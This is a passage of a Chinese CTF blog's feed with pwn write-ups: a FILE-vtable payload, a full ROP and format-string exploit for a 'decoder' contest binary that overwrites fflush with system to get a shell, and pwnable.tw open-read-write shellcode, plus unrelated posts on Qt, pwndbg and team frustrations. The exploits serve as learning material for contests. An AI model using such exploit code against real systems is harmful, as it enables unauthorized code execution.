pwn():</div><div class="line">    p.recvuntil(<span class="string">'name?\n'</span>)</div><div class="line">    payload = <span class="string">'a'</span> * offset</div><div class="line">    # fake_FILE_addr</div><div class="line">    payload += p32(fake_FILE_addr)</div><div class="line">    # fake_FILE</div><div class="line">    payload += <span class="string">'\xff'</span> * <span class="number">0x94</span></div><div class="line">    # fake_jmp_t</div><div class="line">    payload += p32(fake_vtable_addr)</div><div class="line"></div><div class="line">    # fake_vtable</div><div class="line">    payload += p32(p_r)</div><div class="line">    payload += p32(un_FILE_addr + <span class="number">300</span>)</div><div class="line">    payload += p32(x_r) *  <span class="number">16</span></div><div class="line"></div><div class="line">    # mprotect</div><div class="line">    junk = <span class="number">300</span> - len(payload) + <span class="number">32</span></div><div class="line">    payload += cyclic(junk)</div><div class="line">    payload += p32(mprotect_addr)</div><div class="line">    payload += p32(un_FILE_addr + <span class="number">300</span> + <span class="number">20</span>) # shellcode addr</div><div class="line">    payload += p32(<span class="number">0x080ef000</span>)</div><div class="line">    payload += p32(<span class="number">1024</span>)</div><div class="line">    payload += p32(<span class="number">7</span>)</div><div class="line">    payload += asm(shellcode)</div><div class="line">    gdb.attach(p)</div><div class="line"></div><div class="line">    p.sendline(payload)</div><div class="line"></div><div class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'3'</span>)</div><div class="line"></div><div class="line">if __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pwn()</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure></p>
<h2 id="南京线下赛decoder"><a href="#南京线下赛decoder" class="headerlink" title="南京线下赛decoder"></a>南京线下赛decoder</h2><p><code>checksec</code>:<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@kali ~/c/NJoffline<span class="comment"># checksec decoder</span></div><div class="line">[*] <span class="string">'/root/ctf-problem/NJoffline/decoder'</span></div><div class="line"><span class="attr">    Arch:</span>     i386<span class="bullet">-32</span>-little</div><div class="line"><span class="attr">    RELRO:</span>    Partial RELRO</div><div class="line"><span class="attr">    Stack:</span>    <span class="literal">No</span> canary found</div><div class="line"><span class="attr">    NX:</span>       NX enabled</div><div class="line"><span class="attr">    PIE:</span>      <span class="literal">No</span> PIE (<span class="number">0x8048000</span>)</div></pre></td></tr></table></figure></p>
<p>没开什么保护，观察后发现存在栈溢出，但是不能构造rop，因为esp的地址是由栈上数据给的，直接覆盖的话会ret到奇怪的地方去，也就是说造成栈溢出的栈底数据是我们不可控的。</p>
<p>所以，如果我们能够栈的位置到可控部分，我们就可以劫持eip，构造rop chain。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">root@kali ~/c/NJoffline# ROPgadget --binary decoder | grep <span class="string">'esp'</span></div><div class="line"><span class="number">0x08048490</span> : <span class="keyword">add</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], <span class="built_in">al</span> <span class="comment">; add esp, 8 ; pop ebx ; ret</span></div><div class="line"><span class="number">0x08048605</span> : <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">0x10</span> <span class="comment">; leave ; ret</span></div><div class="line"><span class="number">0x08048b31</span> : <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">0x40</span> <span class="comment">; pop edi ; pop ebp ; ret</span></div><div class="line"><span class="number">0x08048d35</span> : <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">0xc</span> <span class="comment">; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></div><div class="line"><span class="number">0x08048492</span> : <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">8</span> <span class="comment">; pop ebx ; ret</span></div><div class="line"><span class="number">0x08048af7</span> : <span class="keyword">and</span> <span class="built_in">esp</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span> + <span class="number">0x804b054</span>] <span class="comment">; nop ; pop ebp ; ret</span></div><div class="line"><span class="number">0x08048cd7</span> : <span class="keyword">clc</span> <span class="comment">; pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class="line"><span class="number">0x0804848e</span> : <span class="keyword">inc</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>] <span class="comment">; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret</span></div><div class="line"><span class="number">0x08048687</span> : <span class="keyword">je</span> <span class="number">0x8048684</span> <span class="comment">; push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx</span></div><div class="line"><span class="number">0x08048d33</span> : <span class="keyword">jne</span> <span class="number">0x8048d21</span> <span class="comment">; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></div><div class="line"><span class="number">0x08048cd5</span> : <span class="keyword">lea</span> <span class="built_in">esp</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">8</span>] <span class="comment">; pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class="line"><span class="number">0x08048cdb</span> : <span class="keyword">lea</span> <span class="built_in">esp</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span> - <span class="number">4</span>] <span class="comment">; ret</span></div><div class="line"><span class="number">0x08048d4f</span> : <span class="keyword">mov</span> <span class="built_in">bl</span>, <span class="number">0x22</span> <span class="comment">; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret</span></div><div class="line"><span class="number">0x0804868a</span> : <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span> <span class="comment">; sub esp, 0x14 ; push eax ; call edx</span></div><div class="line"><span class="number">0x080485d0</span> : <span class="keyword">mov</span> <span class="built_in">ebx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>] <span class="comment">; ret</span></div><div class="line"><span class="number">0x08048b30</span> : <span class="keyword">nop</span> <span class="comment">; add esp, 0x40 ; pop edi ; pop ebp ; ret</span></div><div class="line"><span class="number">0x080485cf</span> : <span class="keyword">nop</span> <span class="comment">; mov ebx, dword ptr [esp] ; ret</span></div><div class="line"><span class="number">0x080485cd</span> : <span class="keyword">nop</span> <span class="comment">; nop ; mov ebx, dword ptr [esp] ; ret</span></div><div class="line"><span class="number">0x080485cb</span> : <span class="keyword">nop</span> <span class="comment">; nop ; nop ; mov ebx, dword ptr [esp] ; ret</span></div><div class="line"><span class="number">0x08048cda</span> : <span class="keyword">pop</span> <span class="built_in">ebp</span> <span class="comment">; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class="line"><span class="number">0x08048cd8</span> : <span class="keyword">pop</span> <span class="built_in">ecx</span> <span class="comment">; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class="line"><span class="number">0x08048cd9</span> : <span class="keyword">pop</span> <span class="built_in">edi</span> <span class="comment">; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret</span></div><div class="line"><span class="number">0x08048689</span> : <span class="keyword">push</span> <span class="built_in">ebp</span> <span class="comment">; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx</span></div><div class="line"><span class="number">0x08048634</span> : <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">0x10</span> <span class="comment">; push eax ; push 0x804b04c ; call edx</span></div><div class="line"><span class="number">0x080485fb</span> : <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">0x14</span> <span class="comment">; push 0x804b04c ; call eax</span></div><div class="line"><span class="number">0x0804868c</span> : <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">0x14</span> <span class="comment">; push eax ; call edx</span></div><div class="line"><span class="number">0x08048475</span> : <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">8</span> <span class="comment">; call 0x80485d9</span></div><div class="line"><span class="number">0x08048af6</span> : <span class="keyword">xor</span> <span class="built_in">esp</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>] <span class="comment">; mov dword ptr [0x804b054], eax ; nop ; pop ebp ; ret</span></div></pre></td></tr></table></figure>
<p>发现这几条还是可用的：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x08048490</span> : <span class="keyword">add</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], <span class="built_in">al</span> <span class="comment">; add esp, 8 ; pop ebx ; ret</span></div><div class="line"><span class="number">0x08048605</span> : <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">0x10</span> <span class="comment">; leave ; ret</span></div><div class="line"><span class="number">0x08048b31</span> : <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">0x40</span> <span class="comment">; pop edi ; pop ebp ; ret</span></div><div class="line"><span class="number">0x08048d35</span> : <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">0xc</span> <span class="comment">; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></div><div class="line"><span class="number">0x08048492</span> : <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">8</span> <span class="comment">; pop ebx ; ret</span></div></pre></td></tr></table></figure></p>
<p>于是我们的思路如下：</p>
<ol>
<li>在栈上利用gadget<code>0x08048b31</code>布置好ropchain</li>
<li>利用fsb将fflish改为我们的gadget<code>0x08048b31</code></li>
<li>在bss写入<code>/bin/sh</code></li>
<li>修改fflush为system</li>
</ol>
<p>附上南大某女生exp:<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/usr/bin/env python</span></div><div class="line"><span class="meta"># coding=utf-8</span></div><div class="line">from pwn import *</div><div class="line">import base64</div><div class="line"></div><div class="line">slog = <span class="number">1</span></div><div class="line"><span class="keyword">local</span> = <span class="number">1</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> slog: context.log_level = <span class="literal">True</span></div><div class="line"><span class="keyword">if</span> <span class="keyword">local</span>:</div><div class="line">    p = process(<span class="string">'./decoder'</span>)</div><div class="line">    libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote(<span class="string">'172.16.1.10'</span>, <span class="number">20000</span>)</div><div class="line">    libc = ELF(<span class="string">'./lib/i386-linux-gnu/libc-2.19.so'</span>)</div><div class="line"></div><div class="line"></div><div class="line">elf = ELF(<span class="string">'decoder'</span>)</div><div class="line"></div><div class="line">printf_got = elf.got[<span class="string">'printf'</span>]		<span class="meta">#  0x80484c0</span></div><div class="line">printf_plt = elf.symbols[<span class="string">'printf'</span>] </div><div class="line">read_addr = elf.symbols[<span class="string">'read'</span>]</div><div class="line">fflush_plt = elf.symbols[<span class="string">'fflush'</span>]</div><div class="line"></div><div class="line">realloc_got = elf.got[<span class="string">'realloc'</span>]</div><div class="line">fflush_got = elf.got[<span class="string">'fflush'</span>]</div><div class="line"></div><div class="line">main_addr = <span class="number">0x804836e</span></div><div class="line"></div><div class="line">print(<span class="string">'fflush_got = '</span> + <span class="built_in">hex</span>(fflush_got))</div><div class="line">print(<span class="string">'printf_plt = '</span> + <span class="built_in">hex</span>(printf_plt))</div><div class="line"></div><div class="line">addesp_72 = <span class="number">0x08048b31</span></div><div class="line">rodata = <span class="number">0x8048de0</span> <span class="meta"># <span class="string">'%d:%s'</span></span></div><div class="line">bss_addr = <span class="number">0x804b050</span></div><div class="line"></div><div class="line">s = base64.b64encode(<span class="string">'%02052d%20$hn%033581d%21$hn%22$x'</span>)  <span class="meta"># add_esp</span></div><div class="line"></div><div class="line">payload = s + (<span class="number">13</span> - len(s) / <span class="number">4</span>) * p32(<span class="number">0</span>) + p32(printf_plt)+ p32(addesp_72) + p32(rodata) + p32(<span class="number">1</span>) + p32(printf_got)</div><div class="line"><span class="meta"># printf(rodata, <span class="string">'1'</span>, printf_got) </span></div><div class="line"><span class="meta"># 0xffa8a3f4 </span></div><div class="line">payload += p32(fflush_got + <span class="number">2</span>) + p32(fflush_got) + p32(fflush_got) </div><div class="line"></div><div class="line">payload += p32(<span class="number">0x1</span>) * <span class="number">0xc</span>  + p32(read_addr) + p32(addesp_72) + p32(<span class="number">0</span>) + p32(fflush_got) + p32(<span class="number">4</span>)   <span class="meta">#0xffa8a434 -&gt; read</span></div><div class="line"></div><div class="line">payload += p32(<span class="number">0x2</span>) * <span class="number">0xf</span> + p32(read_addr) + p32(addesp_72) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>)</div><div class="line"></div><div class="line">payload += p32(<span class="number">0x3</span>) * <span class="number">0xf</span> + p32(fflush_plt) + p32(<span class="number">0xdeadbeef</span>) + p32(bss_addr)</div><div class="line"></div><div class="line"><span class="meta"># gdb.attach(p, open(<span class="string">'debug'</span>))</span></div><div class="line">gdb.attach(p)</div><div class="line">p.recvuntil(<span class="string">'DECODER\n'</span>)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">':'</span>)</div><div class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</div><div class="line"></div><div class="line">system_addr = printf_addr + libc.symbols[<span class="string">'system'</span>] - libc.symbols[<span class="string">'printf'</span>]</div><div class="line"><span class="meta">#binsh_addr = printf_addr + next(libc.search(<span class="string">'/bin/sh'</span>)) - libc.symbols[<span class="string">'printf'</span>]</span></div><div class="line"></div><div class="line">print(<span class="string">'system_addr = '</span> + <span class="built_in">hex</span>(system_addr))</div><div class="line"></div><div class="line">p.<span class="built_in">send</span>(p32(system_addr))</div><div class="line">p.<span class="built_in">send</span>(<span class="string">"/bin/sh\0"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<h2 id="2017BCTF100levels"><a href="#2017BCTF100levels" class="headerlink" title="2017BCTF100levels"></a>2017BCTF100levels</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h2&gt;&lt;p&gt;连着好几次遇到栈迁移问题了，总结记录下。&lt;br&gt;每一种的类型都不一样，不过目的都是一样的，就是将esp或ebp变为我们可控的数据，大概可以分为三类：
    
    </summary>
    
    
      <category term="PWN" scheme="http://reehy.top/tags/PWN/"/>
    
      <category term="stack" scheme="http://reehy.top/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>Qt初体验</title>
    <link href="http://reehy.top/2017/04/23/Qt%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://reehy.top/2017/04/23/Qt初体验/</id>
    <published>2017-04-23T12:31:08.000Z</published>
    <updated>2017-04-26T08:38:03.094Z</updated>
    
    <content type="html"><![CDATA[<p>最近要给辩论赛做个计数器，以前那个丢了，正好来试试Qt的使用。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近要给辩论赛做个计数器，以前那个丢了，正好来试试Qt的使用。&lt;/p&gt;

    
    </summary>
    
    
      <category term="Qt" scheme="http://reehy.top/tags/Qt/"/>
    
      <category term="C/C++" scheme="http://reehy.top/tags/C-C/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw</title>
    <link href="http://reehy.top/2017/04/23/pwnable-tw/"/>
    <id>http://reehy.top/2017/04/23/pwnable-tw/</id>
    <published>2017-04-23T12:00:03.000Z</published>
    <updated>2017-04-23T12:03:32.317Z</updated>
    
    <content type="html"><![CDATA[<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p><a href="https://www.tutorialspoint.com/assembly_programming/assembly_file_management.htm" target="_blank" rel="external">汇编中i386的系统调用传参方式</a></p>
<p>exp:<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/usr/bin/env python</span></div><div class="line"><span class="meta"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context(log_level = <span class="string">'debug'</span>)</div><div class="line"></div><div class="line">shellcode = shellcraft.i386.sh()</div><div class="line">bss = <span class="number">0x0804a060</span></div><div class="line"><span class="meta">#shellcode = asm(shellcode)</span></div><div class="line"><span class="meta">#shellcode = "\x99\x6a\x0b\x58\x60\x59\xcd\x80"</span></div><div class="line">shellcode = <span class="string">'mov ebx, 0x804a095; mov eax, 5; mov ecx, 0;int 0x80;'</span></div><div class="line">shellcode += <span class="string">'mov ebx, eax; mov eax, 3; mov ecx, 0x804a095; mov edx, 100; int 0x80;'</span></div><div class="line">shellcode += <span class="string">'mov edx, 100; mov ebx, 1; mov eax, 4; int 0x80;'</span></div><div class="line">shellcode = asm(shellcode)</div><div class="line">print len(shellcode)</div><div class="line"></div><div class="line">shellcode += <span class="string">'/home/orw/flag\x00'</span></div><div class="line"><span class="meta"># p = process('./orw')</span></div><div class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10001</span>)</div><div class="line">p.recvuntil(<span class="string">':'</span>)</div><div class="line"><span class="meta">#gdb.attach(p)</span></div><div class="line">p.send(shellcode)</div><div class="line">print p.recvall()</div></pre></td></tr></table></figure></p>
<p>使用syscall代替int 80出错，原因未知，猜测可能为传参方式不同。</p>
<p>用locate定位系统调用号<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@kali ~<span class="regexp">/c/p</span><span class="regexp">/orw# locate unistd_32</span></div><div class="line">/usr<span class="regexp">/include/x</span>86_64-linux-gnu/<span class="keyword">asm</span>/unistd_32.h</div><div class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">x86_64</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">perl</span>/5.22.2/<span class="title">asm</span>/<span class="title">unistd_32</span>.<span class="title">ph</span></span></div><div class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">x86_64</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">perl</span>/5.24.1/<span class="title">asm</span>/<span class="title">unistd_32</span>.<span class="title">ph</span></span></div><div class="line">/usr/src/linux-headers-<span class="number">4.9</span>.<span class="number">0</span>-kali3-amd64/arch/x86/<span class="keyword">include</span>/generated/<span class="keyword">asm</span>/unistd_32_ia32.h</div><div class="line">/usr/src/linux-headers-<span class="number">4.9</span>.<span class="number">0</span>-kali3-amd64/arch/x86/<span class="keyword">include</span>/generated/uapi/<span class="keyword">asm</span>/unistd_32.h</div><div class="line">/usr/src/linux-headers-<span class="number">4.9</span>.<span class="number">0</span>-kali3-common/arch/sh/<span class="keyword">include</span>/uapi/<span class="keyword">asm</span>/unistd_32.h</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;orw&quot;&gt;&lt;a href=&quot;#orw&quot; class=&quot;headerlink&quot; title=&quot;orw&quot;&gt;&lt;/a&gt;orw&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.tutorialspoint.com/assembly_programming/assem
    
    </summary>
    
    
      <category term="PWN" scheme="http://reehy.top/tags/PWN/"/>
    
      <category term="writeup" scheme="http://reehy.top/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>2017BCTF &amp; pwndbg &amp; ida</title>
    <link href="http://reehy.top/2017/04/22/2017BCTF-pwndbg-ida/"/>
    <id>http://reehy.top/2017/04/22/2017BCTF-pwndbg-ida/</id>
    <published>2017-04-22T13:07:06.000Z</published>
    <updated>2017-04-22T13:07:31.214Z</updated>
    
    <content type="html"><![CDATA[<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>pwndbg和ida可以很好的实现将idb文件导入到gdb调试界面中，使得gdb中的函数与变量以及结构体的名字可以和ida同步，并且在ida中可以实时看到调试的进度。</p>
<p>今天发现了这个功能还是很欣喜的，国内没人写，大概我是很早这样用的一批人吧。</p>
<p>pwndbg的README说的很详细了，不在赘述。</p>
<h2 id="babyuse"><a href="#babyuse" class="headerlink" title="babyuse"></a>babyuse</h2><p>看了看别人的wp，总结了几种利用方法。</p>
<ol>
<li>leak都用UAF</li>
<li>malloc一个大内存(&gt;128)，会存在unsortbins中，可以leak出main_arena，计算出libc</li>
<li>利用fastbin的链表结构，leak出heap_base</li>
<li>Nu1L用末尾添加\x00的方法，修改指针最后一位\x00使其指向vtable，leak出pie的地址</li>
<li>shell一般都用one_gadget，Nu1L的<code>_init_arry</code>没看懂。</li>
</ol>
<p>为了方便调试，关闭ASLR，并且简单写了个gdb脚本。</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"># <span class="keyword">import</span> glibc</div><div class="line"># directory ~/desktop/glibc<span class="number">-2.24</span>/malloc/</div><div class="line"></div><div class="line">#######################################################</div><div class="line"># context config</div><div class="line">set ida-rpc-host <span class="number">192.168</span><span class="number">.234</span><span class="number">.1</span></div><div class="line"></div><div class="line">######################################################</div><div class="line"># ignore SIGALRM</div><div class="line"># handle SIGALRM ignore</div><div class="line"></div><div class="line">#######################################################</div><div class="line">define p32break</div><div class="line">	break * <span class="number">0x56555000</span> + $arg0</div><div class="line">end</div><div class="line"></div><div class="line">document p32break</div><div class="line">	break when PIE is on</div><div class="line">end</div><div class="line"></div><div class="line">########################################################</div><div class="line">define p32telescope</div><div class="line">	telescope <span class="number">0x56555000</span>+$arg0 $arg1</div><div class="line">end</div><div class="line"></div><div class="line">document p32telescope</div><div class="line">	telescope when PIE is on</div><div class="line">end</div><div class="line"></div><div class="line">#######################################################</div><div class="line">source aa</div><div class="line">define ssa</div><div class="line">    session save aa</div><div class="line">end</div></pre></td></tr></table></figure>
<h2 id="100levels"><a href="#100levels" class="headerlink" title="100levels"></a>100levels</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;工具&quot;&gt;&lt;a href=&quot;#工具&quot; class=&quot;headerlink&quot; title=&quot;工具&quot;&gt;&lt;/a&gt;工具&lt;/h2&gt;&lt;p&gt;pwndbg和ida可以很好的实现将idb文件导入到gdb调试界面中，使得gdb中的函数与变量以及结构体的名字可以和ida同步，并且在ida
    
    </summary>
    
    
      <category term="PWN" scheme="http://reehy.top/tags/PWN/"/>
    
      <category term="pwndbg" scheme="http://reehy.top/tags/pwndbg/"/>
    
      <category term="ida" scheme="http://reehy.top/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>真是蛋疼的生活</title>
    <link href="http://reehy.top/2017/04/19/%E7%9C%9F%E6%98%AF%E8%9B%8B%E7%96%BC%E7%9A%84%E7%94%9F%E6%B4%BB/"/>
    <id>http://reehy.top/2017/04/19/真是蛋疼的生活/</id>
    <published>2017-04-18T23:54:32.000Z</published>
    <updated>2017-04-19T02:20:46.439Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>前两天南京线下赛结束，我校光荣拿了倒二。</p>
<p>讲道理，不是我责怪队友，而是我真的没办法看着在我日夜奋战时看到他们在划水。平时训练中我对团队一直是放羊式的管理，始终认为激情与活力才是一个团队成功的最终要要素，而硬性的规定只不过是自欺欺人。</p>
<p>但实事总是和我们想象的差太远了。</p>
<p>我不明白还有什么方法能够挽救我们学校，挽救这个团队。一群没有能力，没有天赋，没有资源，没有创造力与激情的人组成的团队能走多远。我真的很羡慕那些有着可以并肩作战的队友的人，在你困难的时候可以给你鼓励，有勇气知难而上。我们可以一起研究一个问题到深夜，可以一起怼一道题目到把Google前十页的方法都试一遍，一个有技术氛围的团队，能够分享的团队，是1+1&gt;2的。</p>
<p>志不同，道不合。</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>即使对队友有千万的不满，也没办法掩盖自己不够努力的实事。</p>
<p>蓝莲花的队伍一年时间就拿到了DEFCON入围资格，打出了全球19名的成绩。40个月60场拼尽全力的比赛。一场比赛至少一天是通宵的。我原本以为自己已经够努力了，但，无论是和大佬们，还是和他校选手比较，真的还差太多。</p>
<p>大二了，当初给自己定的目标也完成了大概。但依旧一无所成。</p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>我已经快放弃我们队伍了。大佬们自生自灭吧，带不动。</p>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>没办法，资源太少了，未来还是会读研的吧。也不再为高考找借口了，只是4年差距太难弥补了，尽力吧。</p>
<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>总的来说，第一次参加线下赛，玩的还是蛮开心的，但是一直被打并不觉得很爽= =。。。</p>
<p>真是蛋疼的生活啊。。。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;前两天南京线下赛结束，我校光荣拿了倒二。&lt;/p&gt;
&lt;p&gt;讲道理，不是我责怪队友，而是我真的没办法看着在我日夜奋战时看到他们在
    
    </summary>
    
    
      <category term="life" scheme="http://reehy.top/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>Pwn的FILE结构体</title>
    <link href="http://reehy.top/2017/04/14/Pwn%E7%9A%84FILE%E7%BB%93%E6%9E%84%E4%BD%93/"/>
    <id>http://reehy.top/2017/04/14/Pwn的FILE结构体/</id>
    <published>2017-04-14T02:27:39.000Z</published>
    <updated>2017-04-14T03:18:26.527Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>神tm的，我写了两个半小时的文章啊，就这么没了。就在我随手把浏览器关掉的时候意识到，“等等，我好像忘了什么东西”，果然。。没有断电保存功能的编辑器坑啊。。<br>(╯‵□′)╯︵┻━┻<br>(╯‵□′)╯︵┻━┻<br>(╯‵□′)╯︵┻━┻<br>好了回到FILE结构体这个问题上来。由于两次碰见这个东西了，意识到似乎比赛中开始多了起来，于是趁热学习下，提高自己的姿势水平。</p>
<h2 id="FILE结构体"><a href="#FILE结构体" class="headerlink" title="FILE结构体"></a>FILE结构体</h2><p>首先我们知道linux中遵循“所有接口皆文件”的原则，输入输出做成了文件的形式。</p>
<p>以下所有关键词搜索命令为<br><code>grep -rn &quot;struct _IO_FILE {&quot; --include=&quot;*.h&quot; /usr/include</code></p>
<p>其中<code>_IO_2_1_stdout_</code>的结构体如下：</p>
